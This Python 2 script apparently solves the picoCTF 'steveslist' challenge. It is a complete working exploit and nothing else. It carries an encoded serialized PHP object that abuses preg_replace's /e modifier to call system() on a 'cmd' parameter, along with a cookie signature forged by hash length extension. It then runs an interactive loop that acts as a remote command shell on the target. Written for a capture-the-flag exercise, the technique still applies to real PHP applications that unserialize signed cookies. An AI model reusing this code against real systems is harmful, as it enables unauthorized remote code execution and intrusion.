import requests

url = 'http://steveslist.picoctf.com/'

cookies = {
    # this cookie contains a Post object which exploits preg_replace to execute arbitrary commands
    # via the 'cmd' parameter
    'custom_settings': '%25%36%32%25%33%61%25%33%31%25%33%62%25%38%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%36%30%25%30%61%25%34%66%25%33%61%25%33%34%25%33%61%25%32%32%25%35%30%25%36%66%25%37%33%25%37%34%25%32%32%25%33%61%25%33%33%25%33%61%25%37%62%25%37%33%25%33%61%25%33%38%25%33%61%25%32%32%25%30%30%25%32%61%25%30%30%25%37%34%25%36%39%25%37%34%25%36%63%25%36%35%25%32%32%25%33%62%25%37%33%25%33%61%25%33%30%25%33%61%25%32%32%25%32%32%25%33%62%25%37%33%25%33%61%25%33%37%25%33%61%25%32%32%25%30%30%25%32%61%25%30%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%32%25%33%62%25%37%33%25%33%61%25%33%30%25%33%61%25%32%32%25%32%32%25%33%62%25%37%33%25%33%61%25%33%31%25%33%30%25%33%61%25%32%32%25%30%30%25%32%61%25%30%30%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%37%33%25%32%32%25%33%62%25%36%31%25%33%61%25%33%31%25%33%61%25%37%62%25%36%39%25%33%61%25%33%30%25%33%62%25%34%66%25%33%61%25%33%36%25%33%61%25%32%32%25%34%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%32%25%33%61%25%33%32%25%33%61%25%37%62%25%37%33%25%33%61%25%33%31%25%33%30%25%33%61%25%32%32%25%30%30%25%32%61%25%30%30%25%37%30%25%36%31%25%37%34%25%37%34%25%36%35%25%37%32%25%36%65%25%32%32%25%33%62%25%37%33%25%33%61%25%33%35%25%33%61%25%32%32%25%32%66%25%32%65%25%32%61%25%32%66%25%36%35%25%32%32%25%33%62%25%37%33%25%33%61%25%33%37%25%33%61%25%32%32%25%30%30%25%32%61%25%30%30%25%37%32%25%36%35%25%37%30%25%36%63%25%32%32%25%33%62%25%37%33%25%33%61%25%33%32%25%33%30%25%33%61%25%32%32%25%37%33%25%37%39%25%37%33%25%37%34%25%36%35%25%36%64%25%32%38%25%32%34%25%35%66%25%34%37%25%34%35%25%35%34%25%35%62%25%32%32%25%36%33%25%36%64%25%36%34%25%32%32%25%35%64%25%32%39%25%32%32%25%33%62%25%37%64%25%37%64%25%37%64',

    # valid signature generated using hashpump
    'custom_settings_hash': 'f8be61f21b05cfd6e0a29ec284e54ad70e3136a2',
}

while True:
    cmd = raw_input('$ ')

    if cmd.lower() in ['exit', 'quit']:
        break

    resp = requests.get(url, params={'cmd':cmd}, cookies=cookies)

    start = resp.text.index('</html>') + len('</html>') + 1
    end = resp.text.index('<!-- POST') - 1

    print resp.text[start:end]
